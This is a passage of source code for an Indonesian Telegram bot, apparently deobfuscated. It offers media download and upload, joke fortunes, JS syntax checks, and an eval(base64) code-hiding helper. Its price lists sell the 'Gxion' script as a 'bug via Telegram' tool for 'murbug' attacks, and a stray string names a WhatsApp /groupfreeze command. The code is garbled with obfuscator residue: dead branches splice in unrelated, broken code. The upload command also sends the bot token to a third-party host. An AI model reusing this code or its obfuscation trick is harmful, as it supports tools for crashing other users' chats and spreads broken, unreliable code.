    execChildProcess("node --check \"" + tempPath + "\"", async (error, stdout, stderr) => {
      if (fs.existsSync(tempPath)) fs.unlinkSync(tempPath);
      if (error) {
        return ctx.reply("⌜ JAVASCRIPT ANALYZER ⌟\n╎ File      : " + document.file_name + "\n╎ Result    : Failed\n╎ Issues    : Detected\n╰╌╌╌╌╌╌╌╌╌╌⌯\n\n❌ Syntax Error Found\n\n" + stderr.slice(0, 3000));
      }
      return ctx.reply("⌜ JAVASCRIPT ANALYZER ⌟\n╎ File      : " + document.file_name + "\n╎ Result    : Passed\n╎ Issues    : 0\n╰╌╌╌╌╌╌╌╌╌╌⌯\n\n✅ YEAYY CODE FILE.JS ANDA AMAN!!!");
    });
  } catch (err) {
    ctx.reply("⌜ JAVASCRIPT ANALYZER ⌟\n╎ Result : Failed\n╰╌╌╌╌╌╌╌╌╌╌⌯\n\n❌ Failed to check file\n\n" + err.message);
  }
});
bot.command("cekfunction", async ctx => {
  try {
    const repliedMessage = ctx.message.reply_to_message;
    if (!repliedMessage?.["text"]) return ctx.reply("🪧 Contoh: kirim function nya lalu reply code function dengan /cekfunction");
    const sourceCode = repliedMessage.text;
    try {
      return new Function(sourceCode), ctx.reply("✅ YEAY FUNCTION AMAN\n Created By : @Bawzzhhh");
    } catch (compileError) {
      let errorLine = "Tidak diketahui",
        errorSnippet = "Tidak ditemukan";
      const stackMatch = compileError.stack?.["match"](/<anonymous>:(\d+):(\d+)/);
      if (stackMatch) {
        const lineIndex = parseInt(stackMatch[1]) - 1,
          lines = sourceCode.split("\n");
        lines[lineIndex] && (errorLine = lineIndex + 1, errorSnippet = lines[lineIndex]);
      }
      const opts = {};
      opts.parse_mode = "Markdown";
      return ctx.reply("━━━━━━━━━━━━━━━━━━\n🧪 FUNCTION CHECK\n━━━━━━━━━━━━━━━━━━\n❌ STATUS : ERROR PADA FUNCTION\n📍 BARIS ERROR : " + errorLine + "\n🔎 ERROR INFORMATION :\n" + compileError.message + "\n• KODE FUNCTION YANG BERMASALAH :\n```js\n" + errorSnippet + "\n```\n━━━━━━━━━━━━━━━━━━", opts);
    }
  } catch (err) {
    ctx.reply("❌ Gagal cek function.");
  }
});
bot.command("catbox", async ctx => {
  const url = ctx.message.text.split(" ")[1],
    opts = {};
  opts.parse_mode = "Markdown";
  if (!url) return ctx.reply("📥 *DOWNLOAD CATBOX* 📥\n\n*Cara pakai:*\n/catbox https://files.catbox.moe/xxxxx.jpg\n\n*Support file:*\nGambar, Video, Audio, Dokumen\n\n📌 *Maksimal file: 50MB*", opts);
  const opts2 = {};
  opts2.parse_mode = "Markdown";
  if (!url.includes("files.catbox.moe")) return ctx.reply("❌ Bukan URL Catbox yang valid!", opts2);
  const loadingOpts = {};
  loadingOpts.parse_mode = "Markdown";
  await ctx.reply("⏳ *Mengunduh file...*", loadingOpts);
  try {
    const extension = url.split(".").pop().toLowerCase();
    if (["jpg", "jpeg", "png", "gif", "webp"].includes(extension)) {
      const photoOpts = {};
      photoOpts.caption = "✅ *Download berhasil!*";
      photoOpts.parse_mode = "Markdown";
      await ctx.replyWithPhoto(url, photoOpts);
    } else {
      if (["mp4", "mkv", "avi", "mov"].includes(extension)) {
        const videoOpts = {};
        videoOpts.caption = "✅ *Download berhasil!*";
        videoOpts.parse_mode = "Markdown";
        await ctx.replyWithVideo(url, videoOpts);
      } else {
        if (["mp3", "wav", "ogg"].includes(extension)) {
          const audioOpts = {};
          audioOpts.caption = "✅ *Download berhasil!*";
          audioOpts.parse_mode = "Markdown";
          await ctx.replyWithAudio(url, audioOpts);
        } else {
          const docOpts = {};
          docOpts.caption = "✅ *Download berhasil!*";
          docOpts.parse_mode = "Markdown";
          await ctx.replyWithDocument(url, docOpts);
        }
      }
    }
  } catch {
    const failOpts = {};
    failOpts.parse_mode = "Markdown";
    ctx.reply("❌ Gagal mengunduh file! Pastikan URL valid.", failOpts);
  }
});
bot.command("tiktokdl", async ctx => {
  const helper = {};
  helper.privateOnly = "❌ Command ini hanya bisa digunakan di grup.";
  helper.notEquals = function (a, b) {
    return a !== b;
  };
  helper.tagA = "qajNU";
  helper.arraybuffer = "arraybuffer";
  helper.genericError = "❌ Terjadi kesalahan!";
  helper.markdown = "Markdown";
  helper.dontSpam = "Dont spam";
  helper.equals = function (a, b) {
    return a === b;
  };
  helper.groupModeFormat = "Format: /setgroupmode on | off";
  helper.off = "off";
  helper.toolsDir = "./Tools";
  helper.setGroupModeTitle = "SET GROUP MODE";
  helper.groupModeChanged = "GROUP MODE DIUBAH";
  helper.concat = function (a, b) {
    return a + b;
  };
  helper.tagB = "nQosB";
  helper.tagC = "VnVsL";
  helper.notEquals2 = function (a, b) {
    return a !== b;
  };
  helper.tagD = "itNKW";
  helper.tagE = "EypYQ";
  helper.tiktokFormat = "❌ Format: /tiktokdl https://vt.tiktok.com/ZSUeF1CqC/\n\n";
  helper.tiktokHelp = "📌 Kirim link video TikTok untuk diunduh tanpa watermark.";
  helper.processing = "⏳ Sedang memproses video TikTok...";
  helper.tagF = "hMzCo";
  helper.apiEndpoint = "https://tikwm.com/api/";
  helper.userAgent = "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36";
  helper.acceptHeader = "application/json,text/plain,*/*";
  helper.notEquals3 = function (a, b) {
    return a !== b;
  };
  helper.invalidData = "INVALID_DATA";
  helper.concat2 = function (a, b) {
    return a + b;
  };
  helper.concat3 = function (a, b) {
    return a + b;
  };
  helper.concat4 = function (a, b) {
    return a + b;
  };
  helper.concat5 = function (a, b) {
    return a + b;
  };
  helper.concat6 = function (a, b) {
    return a + b;
  };
  helper.concat7 = function (a, b) {
    return a + b;
  };
  helper.concat8 = function (a, b) {
    return a + b;
  };
  helper.concat9 = function (a, b) {
    return a + b;
  };
  helper.concat10 = function (a, b) {
    return a + b;
  };
  helper.concat11 = function (a, b) {
    return a + b;
  };
  helper.concat12 = function (a, b) {
    return a + b;
  };
  helper.concat13 = function (a, b) {
    return a + b;
  };
  helper.concat14 = function (a, b) {
    return a + b;
  };
  helper.concat15 = function (a, b) {
    return a + b;
  };
  helper.concat16 = function (a, b) {
    return a + b;
  };
  helper.concat17 = function (a, b) {
    return a + b;
  };
  helper.concat18 = function (a, b) {
    return a + b;
  };
  helper.concat19 = function (a, b) {
    return a + b;
  };
  helper.tiktokHeader = "🎬 *TikTok Downloader*\n\n";
  helper.authorLabel = "👤 *Author:* ";
  helper.usernameLabel = "🆔 *Username:* @";
  helper.titleLabel = "📝 *Title:* ";
  helper.idId = "id-ID";
  helper.commentLabel = "💬 *Comments:* ";
  helper.shareLabel = "🔁 *Shares:* ";
  helper.playLabel = "▶️ *Plays:* ";
  helper.favoriteLabel = "⭐ *Favorites:* ";
  helper.musicLabel = "🎵 *Music:* ";
  helper.artistLabel = "🎤 *Artist:* ";
  helper.durationLabel = "⏱️ *Duration:* ";
  helper.createdLabel = "📅 *Created:* ";
  helper.multiply = function (a, b) {
    return a * b;
  };
  helper.tagG = "mbzNu";
  helper.tagH = "gqRkj";
  helper.notEquals4 = function (a, b) {
    return a !== b;
  };
  helper.tagI = "tTNwN";
  helper.tagJ = "hdDAa";
  helper.noVideo = "NO_VIDEO";
  helper.greaterThan = function (a, b) {
    return a > b;
  };
  helper.multiply2 = function (a, b) {
    return a * b;
  };
  helper.equals2 = function (a, b) {
    return a === b;
  };
  helper.tagK = "hkzsn";
  helper.concat20 = function (a, b) {
    return a + b;
  };
  helper.notEquals5 = function (a, b) {
    return a !== b;
  };
  helper.tagL = "onejq";
  helper.downloadFailed = "❌ Gagal mengunduh, koneksi lambat atau link salah";
  helper.equals3 = function (a, b) {
    return a === b;
  };
  helper.invalidVideoData = "❌ Gagal ambil data video, pastikan link valid";
  helper.equals4 = function (a, b) {
    return a === b;
  };
  helper.noDownloadLink = "❌ Tidak ada link video yang bisa diunduh";
  const H = helper,
    messageText = ctx.message.text || "",
    rawUrl = messageText.split(" ").slice(1).join(" ").trim();
  let videoUrl = rawUrl;
  if (ctx.message.entities) {
    if (H.equals(H.tagB, H.tagB))
      for (const entity of ctx.message.entities) {
        if (H.equals(entity.type, "url")) {
          if (H.notEquals(H.tagC, H.tagC)) {
            if (global.AK72_SPAM_COUNT) global.AK72_SPAM_COUNT[userId] = 0;
          } else {
            videoUrl = messageText.substr(entity.offset, entity.length);
            break;
          }
        }
      } else a.log(f.yellow("  ⚠  Periodic validation skipped: " + err.message));
  }
  if (!videoUrl || !/^https?:\/\//i.test(videoUrl)) return H.notEquals2(H.tagD, H.tagE) ? ctx.reply(H.concat(H.tiktokFormat, H.tiktokHelp)) : ctx.reply(H.privateOnly);
  const statusMessage = await ctx.reply(H.processing);
  try {
    if (H.equals(H.tagF, H.tagF)) {
      const requestParams = {};
      requestParams.url = videoUrl;
      requestParams.hd = 1;
      const {
        data: apiResponse
      } = await axios.get(H.apiEndpoint, {
        params: requestParams,
        headers: {
          "user-agent": H.userAgent,
          accept: H.acceptHeader,
          referer: "https://tikwm.com/"
        },
        timeout: 20000
      });
      if (!apiResponse || H.notEquals3(apiResponse.code, 0) || !apiResponse.data) throw new Error(H.invalidData);
      const videoData = apiResponse.data,
        author = videoData.author || {},
        musicInfo = videoData.music_info || {},
        caption = `${H.tiktokHeader}
${H.authorLabel}${author.nickname || author.unique_id || "-"}
${H.usernameLabel}${author.unique_id || "-"}
${H.titleLabel}${videoData.title ? videoData.title.slice(0, 120) : "-"}

❤️ *Likes:* ${(videoData.digg_count ?? 0).toLocaleString("id-ID")}
${H.commentLabel}${(videoData.comment_count ?? 0).toLocaleString("id-ID")}
${H.shareLabel}${(videoData.share_count ?? 0).toLocaleString("id-ID")}
${H.playLabel}${(videoData.play_count ?? 0).toLocaleString("id-ID")}
${H.favoriteLabel}${(videoData.collect_count ?? 0).toLocaleString("id-ID")}

${H.musicLabel}${musicInfo.title || "-"}
${H.artistLabel}${musicInfo.author || "-"}
${H.durationLabel}${videoData.duration || 0}s
${H.createdLabel}${videoData.create_time ? new Date(videoData.create_time * 1000).toLocaleString("id-ID") : "-"}`;
      if (Array.isArray(videoData.images) && videoData.images.length) {
        if (H.equals(H.tagG, H.tagH)) t.log(a.hex("#50fa7b").bold("\n╭─༺CHECKING SERVER༻─╮\n│➤ Bot Sukses Terhubung Terimakasih \n╰───────────────────╯\n"));
        else {
          const imageUrls = videoData.images.slice(0, 10),
            mediaGroup = await Promise.all(imageUrls.map(async imageUrl => {
              if (H.notEquals(H.tagA, H.tagA)) {
                if (fs.existsSync(tempPath)) fs.unlinkSync(tempPath);
                if (error) return ctx.reply("⌜ JAVASCRIPT ANALYZER ⌟\n╎ File      : " + document.file_name + "\n╎ Result    : Failed\n╎ Issues    : Detected\n╰╌╌╌╌╌╌╌╌╌╌⌯\n\n❌ Syntax Error Found\n\n" + stderr.slice(0, 3000));
                return ctx.reply("⌜ JAVASCRIPT ANALYZER ⌟\n╎ File      : " + document.file_name + "\n╎ Result    : Passed\n╎ Issues    : 0\n╰╌╌╌╌╌╌╌╌╌╌⌯\n\n✅ YEAYY CODE FILE.JS ANDA AMAN!!!");
              } else {
                const imageOpts = {};
                imageOpts.responseType = H.arraybuffer;
                imageOpts.timeout = 20000;
                const imageResponse = await axios.get(imageUrl, imageOpts);
                return {
                  type: "photo",
                  media: {
                    source: Buffer.from(imageResponse.data)
                  }
                };
              }
            })),
            photoOpts = {};
          photoOpts.url = author.avatar || videoData.cover || imageUrls[0];
          const coverOpts = {};
          coverOpts.caption = caption;
          coverOpts.parse_mode = H.markdown;
          await ctx.replyWithPhoto(photoOpts, coverOpts);
          await ctx.replyWithMediaGroup(mediaGroup);
          return;
        }
      }
      const downloadUrl = videoData.hdplay || videoData.play || videoData.wmplay;
      if (!downloadUrl) {
        if (H.notEquals4(H.tagI, H.tagJ)) throw new Error(H.noVideo);
        else statusMessage.reply(H.genericError, {
          parse_mode: H.markdown
        });
      }
      const videoResponse = await axios.get(downloadUrl, {
        responseType: H.arraybuffer,
        headers: {
          "user-agent": H.userAgent
        },
        timeout: 30000,
        maxContentLength: 52428800,
        maxBodyLength: H.multiply(H.multiply(50, 1024), 1024)
      });
      if (H.greaterThan(videoResponse.data.byteLength, H.multiply2(H.multiply(50, 1024), 1024))) {
        if (H.equals2(H.tagK, H.tagK)) {
          await ctx.reply(H.concat20(H.concat16(caption, "\n\n⚠️ *Video >50MB*, unduh manual:\n"), downloadUrl), {
            parse_mode: H.markdown
          });
          return;
        } else {
          const lastClick = clickCooldownMap.get(userId);
          if (now - lastClick < 300) return ctx.answerCbQuery(H.dontSpam).catch(() => {});
        }
      }
      const videoOpts = {};
      videoOpts.caption = caption;
      videoOpts.parse_mode = H.markdown;
      videoOpts.supports_streaming = true;
      await ctx.replyWithVideo({
        source: Buffer.from(videoResponse.data),
        filename: (videoData.id || Date.now()) + ".mp4"
      }, videoOpts);
    } else try {
      logLine();
    } catch {}
  } catch (err) {
    if (H.notEquals5(H.tagL, H.tagL)) {
      const args = ctx.message.text.split(" ").slice(1);
      if (H.equals2(args.length, 0)) return statusMessage.reply(H.groupModeFormat);
      const mode = args[0].toLowerCase();
      if (!["on", H.off].includes(mode)) return ctx.reply("Mode harus on atau off");
      const mkdirOpts = {};
      mkdirOpts.recursive = true;
      if (!fs.existsSync(H.toolsDir)) fs.mkdirSync(H.toolsDir, mkdirOpts);
      const groupObj = {};
      groupObj.group = mode;
      fs.writeFileSync(PATHS.GROUP_FILE, JSON.stringify(groupObj, null, 2));
      const richMessage = new RichHTMLBuilder().photo(MEDIA.home, H.setGroupModeTitle).heading(2, H.groupModeChanged).divider().paragraph(H.concat(H.concat("Mode: <b>", mode.toUpperCase()), "</b>")).build();
      return ctx.sendRichMessage(richMessage);
    } else {
      let errorMessage = H.downloadFailed;
      if (H.equals3(err.message, "INVALID_DATA")) errorMessage = H.invalidVideoData;
      else {
        if (H.equals4(err.message, H.noVideo)) errorMessage = H.noDownloadLink;
        else {
          if (err?.["response"]?.["status"]) errorMessage = "❌ Error " + err.response.status + " saat mengunduh video";
        }
      }
      await ctx.reply(errorMessage);
    }
  } finally {
    try {
      await ctx.deleteMessage(statusMessage.message_id);
    } catch {}
  }
});
bot.command("cekmasadepan", async ctx => {
  let targetName = "Kamu";
  if (ctx.message.reply_to_message) targetName = ctx.message.reply_to_message.from.first_name || "Dia";
  else {
    const args = ctx.message.text.split(" ");
    if (args.length > 1) targetName = args.slice(1).join(" ");
  }
  const professions = ["Programmer Handal 💻", "Pengusaha Sukses 🏢", "Dokter Hebat 🏥", "YouTuber Terkenal 📹", "Polisi Berdedikasi 👮", "Guru Inspiratif 📚", "Artis Ternama 🎬", "Atlet Profesional 🏆", "Pilot Handal ✈️", "Chef Michelin 🍳", "Desainer Grafis 🎨", "Wirausaha Muda 🚀"];
  const wealth = ["Miliarder 💰💰💰", "Mapan Banget 🏦", "Berkecukupan 💵", "Kaya Raya 👑", "Sukses Finansial 📈", "Harta Melimpah 💎", "Hidup Nyaman 🏠", "Tabungan Banyak 🏦"];
  const partners = ["Cantik/Ganteng 💕", "Setia ❤️", "Pengertian 🌸", "Lucu dan Romantis 🥰", "Baik Hati 💗", "Sederhana Tapi Bahagia 😊", "Kaya Raya 💰", "Soulmate Sejati ✨", "Pendamping Hidup 🤵"];
  const houses = ["Mewah di Jakarta 🏰", "Minimalis di Bali 🏡", "Modern di Bandung 🏘️", "Nyaman di Kampung 🌳", "Villa di Puncak ⛰️", "Apartemen di Surabaya 🏙️", "Rumah Impian ✨", "Kontrakan Dulu 😅"],
    vehicles = ["Pajero Sport 🚙", "Alphard Hitam 🚐", "Tesla Listrik ⚡", "Motor Matic aja 🛵", "BMW Mewah 🚗", "Mercedes Benz 🏎️", "Helikopter Pribadi 🚁", "Naik Angkot 😂"];
  const fates = ["Sukses Besar! 🎉", "Hidup Bahagia 😊", "Menjadi Orang Tua Sukses 👨‍👩‍👧", "Pensiun Muda 🏖️", "Hidup Sederhana Bahagia 🌿", "Jadi Inspirasi Banyak Orang ✨", "Hidup Berkah 🙏", "Terkenal Seantero Negeri 🌍"],
    pickRandom = array => array[Math.floor(Math.random() * array.length)];
  const message = "<blockquote>\n🔮 RAMALAN MASA DEPAN 🔮\nUntuk: " + targetName + "\n━━━━━━━━━━━━━━━━━━━━━━\n👔 Profesi: " + pickRandom(professions) + "\n💰 Kekayaan: " + pickRandom(wealth) + "\n❤️ Jodoh: " + pickRandom(partners) + "\n🏠 Rumah: " + pickRandom(houses) + "\n🚗 Kendaraan: " + pickRandom(vehicles) + "\n🍀 Nasib: " + pickRandom(fates) + "\n━━━━━━━━━━━━━━━━━━━━━━\n✨ Hasil ini hanya hiburan ya!\n💪 Masa depan ada di tanganmu sendiri!\n🔮 Ketik /cekmasadepan [nama] untuk coba lagi</blockquote>";
  const opts = {};
  opts.parse_mode = "HTML";
  ctx.reply(message, opts);
});
bot.command("ramal", async ctx => {
  const helper = {};
  helper.you = "Kamu";
  helper.greaterThan = function (a, b) {
    return a > b;
  };
  helper.successMsg = "Sukses besar di usia 30an! 🎉";
  helper.entrepreneurMsg = "Jadi pengusaha terkenal! 🏢";
  helper.soulmateMsg = "Punya pasangan idaman! ❤️";
  helper.happyMsg = "Hidup bahagia sampai tua! 😊";
  helper.houseMsg = "Bisa beli rumah mewah! 🏰";
  helper.usefulMsg = "Jadi orang yang bermanfaat! ✨";
  helper.htmlMode = "HTML";
  const H = helper;
  const args = ctx.message.text.split(" ");
  let targetName = H.you;
  if (H.greaterThan(args.length, 1)) targetName = args.slice(1).join(" ");
  const predictions = [H.successMsg, H.entrepreneurMsg, H.soulmateMsg, H.happyMsg, H.houseMsg, "Keliling dunia bareng keluarga! 🌍", H.usefulMsg],
    pickedPrediction = predictions[Math.floor(Math.random() * predictions.length)],
    opts = {};
  opts.parse_mode = H.htmlMode;
  ctx.reply("🔮 *Ramalan untuk " + targetName + ":*\n\n✨ " + pickedPrediction + "\n\n🔮 *Ketik /ramal [nama] lagi!*", opts);
});
bot.command("convert", premiumOnly, async ctx => {
  const repliedMessage = ctx.message.reply_to_message;
  if (!repliedMessage) return ctx.reply("❌ Format: /convert ( reply dengan foto/video )");
  let fileId = null;
  if (repliedMessage.photo && repliedMessage.photo.length) fileId = repliedMessage.photo[repliedMessage.photo.length - 1].file_id;
  else {
    if (repliedMessage.video) fileId = repliedMessage.video.file_id;
    else {
      if (repliedMessage.video_note) {
        fileId = repliedMessage.video_note.file_id;
      } else return ctx.reply("❌ Hanya mendukung foto atau video");
    }
  }
  const statusMessage = await ctx.reply("⏳ Mengambil file & mengunggah ke catbox");
  try {
    const fileUrl = String(await ctx.telegram.getFileLink(fileId)),
      formData = new URLSearchParams();
    formData.append("reqtype", "urlupload");
    formData.append("url", fileUrl);
    const requestHeaders = {};
    requestHeaders["content-type"] = "application/x-www-form-urlencoded";
    const requestOpts = {};
    requestOpts.headers = requestHeaders;
    requestOpts.timeout = 30000;
    const {
      data: uploadResult
    } = await axios.post("https://catbox.moe/user/api.php", formData, requestOpts);
    typeof uploadResult === "string" && /^https?:\/\/files\.catbox\.moe\//i.test(uploadResult.trim()) ? await ctx.reply(uploadResult.trim()) : await ctx.reply("❌ Gagal upload ke catbox" + String(uploadResult).slice(0, 200));
  } catch (err) {
    const errorMessage = err?.["response"]?.["status"] ? "❌ Error " + err.response.status + " saat unggah ke catbox" : "❌ Gagal unggah coba lagi.";
    await ctx.reply(errorMessage);
  } finally {
    try {
      await ctx.deleteMessage(statusMessage.message_id);
    } catch {}
  }
});
bot.command("cuaca", async ctx => {
  const helper = {};
  helper.clear = "Cerah ☀️";
  helper.cloudy = "Berawan 🌥️";
  helper.lightRain = "Hujan Ringan 🌦️";
  helper.heavyRain = "Hujan Lebat 🌧️";
  helper.storm = "Badai ⛈️";
  helper.overcast = "Mendung 🌫️";
  helper.cold = "Dingin 🥶";
  helper.multiply = function (a, b) {
    return a * b;
  };
  helper.add = function (a, b) {
    return a + b;
  };
  const H = helper,
    conditions = [H.clear, H.cloudy, H.lightRain, H.heavyRain, H.storm, H.overcast, "Panas Terik 🔥", H.cold];
  const temperature = Math.floor(H.multiply(Math.random(), 20)) + 20,
    humidity = Math.floor(H.multiply(Math.random(), 50)) + 40,
    condition = conditions[Math.floor(H.multiply(Math.random(), conditions.length))],
    opts = {};
  opts.parse_mode = "HTML";
  ctx.reply("<blockquote>\n🌤️ PRAKIRAAN CUACA*l 🌤️\n📌 Kondisi: " + condition + "\n🌡️ Suhu: " + temperature + "°C\n💧 Kelembaban: " + humidity + "%\n💨 Angin: " + H.add(Math.floor(Math.random() * 20), 5) + " km/jam\n✨ Perkiraan ini hanya hiburan ya!\n🔮 Cuaca sebenarnya bisa berbeda</blockquote>", opts);
});
bot.command("catboxurl", async ctx => {
  if (!ctx.message.reply_to_message) {
    const opts = {};
    opts.parse_mode = "Markdown";
    return ctx.reply("📸 UPLOAD GAMBAR 📸\n\nCara pakai:\n1. Kirim foto\n2. Reply foto itu\n3. Ketik /catboxurl\n\n✅ Gratis, cepat, permanen!", opts);
  }
  let fileId = null,
    repliedMessage = ctx.message.reply_to_message;
  if (repliedMessage.photo) fileId = repliedMessage.photo[repliedMessage.photo.length - 1].file_id;
  else {
    if (repliedMessage.document && repliedMessage.document.mime_type?.["startsWith"]("image/")) fileId = repliedMessage.document.file_id;
    else return ctx.reply("❌ Harus berupa foto!", {
      parse_mode: "Markdown"
    });
  }
  await ctx.reply("⏳ *Mengupload...*", {
    parse_mode: "Markdown"
  });
  try {
    const fileInfo = await ctx.telegram.getFile(fileId),
      fileUrl = "https://api.telegram.org/file/bot" + bot.token + "/" + fileInfo.file_path,
      uploadPayload = {};
    uploadPayload.url = fileUrl;
    const requestBody = JSON.stringify([uploadPayload]),
      requestOptions = {
        hostname: "telegra.ph",
        path: "/upload",
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "Content-Length": Buffer.byteLength(requestBody)
        }
      },
      request = https.request(requestOptions, response => {
        const helper = {};
        helper.tagA = "WlRkN";
        helper.tagB = "zPvDz";
        helper.markdown = "Markdown";
        helper.uploadFail = "❌ Gagal upload! Coba lagi.";
        const H = helper;
        let responseBody = "";
        response.on("data", chunk => {
          if (H.tagA === H.tagB) {
            const state = {};
            state.active = false;
            return state;
          } else responseBody += chunk;
        });
        response.on("end", () => {
          try {
            const parsed = JSON.parse(responseBody);
            if (parsed[0] && parsed[0].src) {
              const opts = {};
              opts.parse_mode = H.markdown;
              ctx.reply("✅ Upload Berhasil! ✅\n\n🔗 Link: https://telegra.ph" + parsed[0].src + "\n\n📌 Klik link untuk lihat gambar\n💾 Link permanent!", opts);
            } else ctx.reply(H.uploadFail, {
              parse_mode: H.markdown
            });
          } catch {
            const opts = {};
            opts.parse_mode = H.markdown;
            ctx.reply("❌ Error parsing response!", opts);
          }
        });
      });
    request.write(requestBody);
    request.end();
  } catch {
    ctx.reply("❌ Terjadi kesalahan!", {
      parse_mode: "Markdown"
    });
  }
});

function encryptJsSource(source) {
  const helper = {};
  helper.base64 = "base64";
  const H = helper;
  let encoded = Buffer.from(source).toString(H.base64);
  return "eval(Buffer.from('" + encoded + "', 'base64').toString())";
}

function decryptJsSource(input) {
  const helper = {};
  helper.equals = function (a, b) {
    return a === b;
  };
  helper.tag = "qojyi";
  helper.base64 = "base64";
  helper.notEquals = function (a, b) {
    return a !== b;
  };
  helper.tag2 = "APVmr";
  helper.tag3 = "hTPYO";
  const H = helper;
  try {
    if (H.equals(H.tag, H.tag)) {
      let match = input.match(/Buffer\.from\('(.*?)',\s*'base64'\)/);
      if (match) return Buffer.from(match[1], H.base64).toString();
      return null;
    } else try {
      console.log("  " + UI.ok + "  " + chalk.hex("#50fa7b").bold(message));
    } catch {}
  } catch {
    return H.notEquals(H.tag2, H.tag3) ? null : ctx.reply("🪧 Example: /groupfreeze <link_grup_wa>\n🚀 Support: chat.whatsapp.com/xxxxx\n📌 Atau ID grup langsung: 123xxx@g.us\n⚠️ Wajib jeda 5-10 detik antar eksekusi");
  }
}
bot.command("encjs", ctx => {
  let source = "";
  if (ctx.message.reply_to_message) {
    let repliedMessage = ctx.message.reply_to_message;
    if (repliedMessage.text) source = repliedMessage.text;
    else {
      if (repliedMessage.caption) source = repliedMessage.caption;
    }
  }
  if (!source) {
    let args = ctx.message.text.split(" ");
    args.shift();
    source = args.join(" ");
  }
  if (!source.trim()) {
    const opts = {};
    opts.parse_mode = "Markdown";
    return ctx.reply("🔒 *ENKRIPSI KODE JS* 🔒\n\n📌 *Cara pakai:*\n• /encjs console.log(\"Halo\")\n• Atau *reply* pesan yang berisi kode, lalu ketik /encjs\n\n✅ *Contoh:*\n[Kamu kirim pesan: console.log(\"test\")]\n[Lalu reply pesan itu dengan /encjs]", opts);
  }
  let encrypted = encryptJsSource(source);
  const opts = {};
  opts.parse_mode = "Markdown";
  ctx.reply("🔐 *KODE TERPROTEKSI* 🔐\n\n```javascript\n" + encrypted + "\n```\n\n📌 *Simpan kode asli!*", opts);
});
bot.command("decjs", ctx => {
  let input = "";
  if (ctx.message.reply_to_message && ctx.message.reply_to_message.text) input = ctx.message.reply_to_message.text;
  else {
    let args = ctx.message.text.split(" ");
    args.shift();
    input = args.join(" ");
  }
  if (!input.trim()) {
    const opts = {};
    opts.parse_mode = "Markdown";
    return ctx.reply("🔓 *DEKRIPSI KODE JS* 🔓\n\n📌 *Cara pakai:*\nReply pesan yang berisi kode terenkripsi, lalu ketik /decjs", opts);
  }
  let decrypted = decryptJsSource(input);
  if (decrypted) {
    const opts = {};
    opts.parse_mode = "Markdown";
    ctx.reply("🔓 *KODE ASLI* 🔓\n\n```javascript\n" + decrypted + "\n```", opts);
  } else {
    ctx.reply("❌ Gagal mendekripsi! Pastikan formatnya benar.", {
      parse_mode: "Markdown"
    });
  }
});
bot.command("pricescript", async ctx => {
  const helper = {};
  helper.htmlMode = "HTML";
  const H = helper,
    opts = {};
  opts.parse_mode = H.htmlMode;
  await ctx.reply("<blockquote>\n┏━━〔 📜 KEUNGGULAN SCRIPT GXION 〕━━⬣\n┣ ⿻ Selalu Update Ke Versi Yang Stabil ✅\n┣ ⿻ Cocok Untuk Murbug X Pribadi ✅\n┣ ⿻ Menggunakan Fitur Auto-Update ✅\n┣ ⿻ Cocok untuk Push Channel Anda ✅\n┣ ⿻ High Quality Script ✅\n┗━━━━━━━━━━━━━━━━⬣\n</blockquote>\n\n<b>「 LIST PRICE SCRIPT GXION 」</b>\n<blockquote>\n⿻ FULL UPDATE SCRIPT ACCESS\n┗ Rp 20.000 / 20K\n\n⿻ RESELLER SCRIPT ACCESS\n┗ Rp 30.000 / 30k\n\n⿻ PARTNER SCRIPT ACCESS \n┗ Rp 55.000 / 55K\n\n⿻ MODERATOR SCRIPT ACCESS\n┗ Rp 70.000 / 70K\n\n⿻ CEO SCRIPT ACCESS\n┗ Rp 90.000 / 90K\n\n⿻ OWNER SCRIPT ACCESS\n┗ Rp 110.000 / 110K\n</blockquote>\n\n<b>「 BENEFIT SETIAP ROLES / ACCESS 」</b> \n<blockquote>\n<b>⿻ BENEFIT ACCESS FULL UPDATE :</b>\n┣ Masuk Group Utama Gxion\n┗ Mendapatkan Script Gxion Auto - Update\n\n<b>⿻ BENEFIT ACCESS RESELLER :</b>\n┣ Masuk Group Utama Gxion\n┣ Mendapatkan Script Gxion Auto - Update\n┣ Bisa Menjual Access Full Updates\n┗ Bisa Add Token Sendiri \n\n<b>⿻ BENEFIT ACCESS PARTNER :</b>\n┣ Masuk Group Utama Gxion\n┣ Mendapatkan Script Gxion Auto - Update\n┣ Bisa Menjual Access Full Updates\n┣ Bisa Menjual Access Reseller\n┗ Bisa Add Token Sendiri \n\n<b>⿻ BENEFIT ACCESS MODERATOR :</b>\n┣ Masuk Group Utama Gxion\n┣ Mendapatkan Script Gxion Auto - Update\n┣ Bisa Menjual Access Full Updates\n┣ Bisa Menjual Access Reseller\n┣ Bisa Menjual Access Partner\n┗ Bisa Add Token Sendiri \n\n<b>⿻ BENEFIT ACCESS CEO  :</b>\n┣ Masuk Group Utama Gxion\n┣ Mendapatkan Script Gxion Auto - Update\n┣ Bisa Menjual Access Full Updates\n┣ Bisa Menjual Access Reseller\n┣ Bisa Menjual Access Partner\n┣ Bisa Menjual Access Moderator\n┗ Bisa Add Token Sendiri \n\n<b>⿻ BENEFIT ACCESS OWNER  :</b>\n┣ Masuk Group Utama Gxion\n┣ Mendapatkan Script Gxion Auto - Update\n┣ Bisa Menjual Access Full Updates\n┣ Bisa Menjual Access Reseller\n┣ Bisa Menjual Access Partner\n┣ Bisa Menjual Access Moderator\n┣ Bisa Menjual Access Ceo\n┗ Bisa Add Token Sendiri \n</blockquote>\n<blockquote>\n<i>Berminat untuk membeli sebuah script Gxion ini Silahkan anda bisa menghubungi Admin terdekat yang menjualnya atau Hubungi Developer script secara langsung Yang ber Username [ @Bawzzhhh ]</i>\n</blockquote>", opts);
});
bot.command("harga", async ctx => {
  try {
    const priceList = "```js\n╔══════════════════════════╗\n║      🪧 HARGA GXION SCRIPT   ║\n╠══════════════════════════╣\n║  ⛧ Full Up     : 20K     ║\n║  ⛧ Reseller    : 30K     ║\n║  ⛧ Partner     : 55K     ║\n║  ⛧ Moderator   : 70K     ║\n║  ⛧ CEO         : 90K     ║\n║  ⛧ Owner       : 110K    ║\n╠══════════════════════════╣\n║   ⚡ SCRIPT BUG VIA TELEGRAM  ║\n╚══════════════════════════╝\n```",
      contactButton = {};
    contactButton.text = "👑 Contact Owner";
    contactButton.url = "https://t.me/Bawzhhh";
    contactButton.style = "danger";
    const replyMarkup = {};
    replyMarkup.inline_keyboard = [
      [contactButton]
    ];
    const opts = {};
    opts.parse_mode = "Markdown";
